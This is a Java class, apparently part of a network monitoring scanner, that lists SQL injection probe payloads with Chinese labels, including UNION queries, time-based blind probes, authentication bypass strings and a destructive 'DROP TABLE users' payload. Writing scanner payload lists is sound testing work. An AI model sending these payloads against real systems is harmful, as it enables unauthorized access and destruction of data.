package com.network.monitor.util.payload;

import java.util.ArrayList;
import java.util.List;

public final class SqlInjectionPayload {

    private SqlInjectionPayload() {
    }

    public static List<PayloadCase> getPayloads(String scanType) {
        List<PayloadCase> payloads = new ArrayList<>();
        
        payloads.add(new PayloadCase("1 OR 1=1", "OR 1=1", "布尔型恒真注入探测"));
        
        if ("FULL".equalsIgnoreCase(scanType)) {
            payloads.add(new PayloadCase("1; SELECT 1", "statement_results", "堆叠语句执行探测"));
            payloads.add(new PayloadCase("1 UNION SELECT 1,2,3,4,5", "UNION", "联合查询注入探测"));
            payloads.add(new PayloadCase("1' AND '1'='1", "AND", "字符串型注入探测"));
            payloads.add(new PayloadCase("1; DROP TABLE users--", "DROP", "危险操作注入探测"));
            payloads.add(new PayloadCase("1 AND SLEEP(3)", "SLEEP", "时间盲注探测"));
            payloads.add(new PayloadCase("1' OR '1'='1' --", "--", "注释符绕过探测"));
            payloads.add(new PayloadCase("admin'--", "--", "认证绕过探测"));
            payloads.add(new PayloadCase("1' UNION SELECT NULL,NULL,NULL--", "NULL", "NULL值联合注入"));
        }
        
        return payloads;
    }
}
